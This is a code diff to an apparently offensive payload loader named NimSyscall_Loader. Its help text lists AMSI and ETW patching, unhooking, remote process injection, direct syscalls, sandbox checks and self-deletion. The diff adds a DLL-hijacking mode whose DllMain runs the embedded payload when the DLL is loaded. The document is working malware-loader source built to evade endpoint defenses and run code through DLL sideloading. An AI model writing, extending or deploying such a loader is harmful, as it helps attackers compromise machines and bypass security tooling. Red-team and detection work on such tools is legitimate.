@@ -63,7 +63,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.6
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --dllhijack --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -79,7 +79,8 @@ Options:
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --noRES    Don't set custom resource file information (cmd icon, CMD description by default)
   --dll     Generate DLL instead of an exe
-  --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
+  --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions for e.g. DLL-Sideloading
+  --dllhijack    Add an DLLMain Export with DLL_PROCESS_ATTACH for Hijacking
   --noETW    Don't use ETW Patch
   --noAMSI    Don't patch AMSI
   --noArgs    Don't provide any arguments to the assembly (some can only run without args)
@@ -169,6 +170,7 @@ var
     dll_out: bool = false
     dllfunc: string = ""
     dllexportfunctions: seq[string]
+    dllhijack: bool = false
     big: bool
     remoteprocesses : seq[string]
     targetdomain : string = ""
@@ -266,6 +268,9 @@ if args["--dllexportfunc"]:
   let dllfuncstring = args["--dllexportfunc"]
   dllfunc = fmt"{dllfuncstring}"
   dllexportfunctions = dllfunc.split(',')
+
+if args["--dllhijack"]:
+  dllhijack = true
 
 var customLoaderName: string = rndStr(rand(5..15))
 
@@ -971,6 +976,15 @@ var {rand2} = {rand1}
 
   return trustedwordsstub
 
+let DLLNoHideStub = """
+
+when defined(lib_only):
+    # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
+    # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
+    AttachConsole(-1)
+
+"""
+
 let DllStub = """
 import dynlib
 proc NimMain() {.cdecl, importc.}
@@ -988,26 +1002,24 @@ proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bo
     return true
 """
 
+let DLLHijackStub = """
+
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  NimMain()
+  
+  if fdwReason == DLL_PROCESS_ATTACH:
+    NimMain()
+  if fdwReason == DLL_THREAD_ATTACH:
+    NimMain()
+  #if fdwReason == DLL_PROCESS_ATTACH:
+  #  NimMain()
+  return true
+
+"""
+
 let DllCustomExportStub = """
 proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
     NimMain()
-    return true
-"""
-
-let DllStubRemoteInj = """
-import dynlib
-proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-    return true
-
-proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-    return true
-
-proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-    return true
-"""
-
-let DllCustomExportStubRemoteInj = """
-proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
     return true
 """
 
@@ -1200,16 +1212,14 @@ if (remoteETWpatch or remoteAMSIpatch):
         if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
 stub.add(getRandStub())
 if(dll_out):
-    if (processname == ""):
-        stub.add(DllStub)
-        for f in dllexportfunctions:
-            stub.add(DllCustomExportStub)
-            stub = stub.replace("FUNC_EXPORT", f)
-    else:
-        stub.add(DllStubRemoteInj)
-        for f in dllexportfunctions:
-            stub.add(DllCustomExportStubRemoteInj)
-            stub = stub.replace("FUNC_EXPORT", f)
+    if ((hide == false) and (apiHide == false)):
+        stub.add(DLLNoHideStub)
+    stub.add(DllStub)
+    if(dllhijack):
+        stub.add(DLLHijackStub)
+    for f in dllexportfunctions:
+        stub.add(DllCustomExportStub)
+        stub = stub.replace("FUNC_EXPORT", f)
 stub.add(getRandStub())
 if (peload):
     if (localinject):
